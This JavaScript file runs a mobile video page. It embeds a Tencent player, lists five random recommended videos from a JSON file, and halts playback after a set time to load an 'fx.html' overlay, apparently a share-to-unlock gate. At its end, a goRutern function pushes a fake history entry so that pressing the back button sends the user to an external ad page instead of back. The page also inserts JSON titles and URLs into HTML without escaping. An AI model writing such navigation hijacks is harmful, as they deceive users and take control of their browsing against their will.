var vodeoPlay;
if (sessionStorage.getItem("vodeoPlay") == null) {
    vodeoPlay = 0
} else {
    vodeoPlay = sessionStorage.getItem("vodeoPlay")
}


// ==================.

$.get("./recommends.json", function (data) {
    var picUrl, setVidUrl, titleU, time, dian
    // -----------dian
    if (sessionStorage.getItem("dian") == null) {
        dian = 0
    } else {
        dian = sessionStorage.getItem("dian")
    }
    // ------picUrl
    if (sessionStorage.getItem("picUrl") == null) {
        picUrl = data[0].videoImg
    } else {
        picUrl = sessionStorage.getItem("picUrl")
    }
    // ----setVidUrl
    if (sessionStorage.getItem("setVidUrl") == null) {
        setVidUrl = data[0].vid
    } else {
        setVidUrl = sessionStorage.getItem("setVidUrl")
    }
    // ------------time
    if (sessionStorage.getItem("time") == null) {
        time = data[0].time
    } else {
        time = sessionStorage.getItem("time")
    }
    // --------titleU
    if (sessionStorage.getItem("titleU") == null) {
        titleU = data[0].title
    } else {
        titleU = sessionStorage.getItem("titleU")
    }
    $('#info-z').html(titleU)
    // -------------
    var player = new tvp.Player(100 + '%', 215 + 'px');//视频高宽  
    var video = new tvp.VideoInfo();
    video.setVid(setVidUrl);//视频vid 
    player.setCurVideo(video);
    player.addParam("autoplay", false);//是否自动播放
    player.addParam("wmode", "opaque");
    player.addParam("showend", 0);
    player.addParam("adplay", 0);
    player.addParam("wmode", "transparent");
    player.addParam("pic", picUrl);//默认图片地址  
    player.addParam("flashskin", "http://imgcache.qq.com/minivideo_v1/vd/res/skins/TencentPlayerMiniSkin.swf");//是否调用精简皮肤，不使用则删掉此行代码  
    player.write("videoCon");
    player.ontimeupdate = function (vid) {
        var score = (player.getPlaytime() / 60).toFixed(2)
        if (vodeoPlay == 0) {
            if (score > time) {
                player.pause()
                // sessionStorage.setItem('fx', $('body').html())   
                // window.location.href = './fx.html';
                sessionStorage.setItem('dian', '1')
                location.reload();

            }
        }
    }
    if (dian == 1) {
        $('#fxym').css('display', 'block')
        $("#fxym").load("fx.html")
    }
    // player.onallended = function (vid) {
    //     sessionStorage.removeItem('vodeoPlay')
    // }
    catalog(data)
})

function catalog(json) {
    //生成随机数
    var arr = new Array(json.length - 1)
        .fill(0)
        .map((v, i) => i + 1)
        .sort(() => 0.5 - Math.random())
        .filter((v, i) => i < json.length - 1);
    // console.log(arr)



    for (var i = 0; i < 5; i++) {
        console.log(arr[i]);
        $('.videoList').append('<p  data="' + (json[arr[i]].videoUrl) + '"><span>' + (json[arr[i]].title) + '</span ><img src="' + (json[arr[i]].videoImg) + '" alt=""></p>')

        $('p').eq(i).on('click', function () {

            index = $(this).index()
            sessionStorage.setItem('picUrl', json[arr[index]].videoImg)
            sessionStorage.setItem('titleU', json[arr[index]].title)
            sessionStorage.setItem('setVidUrl', json[arr[index]].vid)
            sessionStorage.setItem('time', json[arr[index]].time)

            location.reload();
        })
    }

}

// 检查物理返回
goRutern()
function goRutern() {
    pushHistory();
    window.addEventListener("popstate", function (e) {
        // 返回广告
        self.location.href = "http://tk2sfdah.dayishengshi.com/adv.php"
    }, false);
    function pushHistory() {
        var state = {
            title: "title",
            url: "#"
        };
        window.history.pushState(state, "title", "#");
    }
}
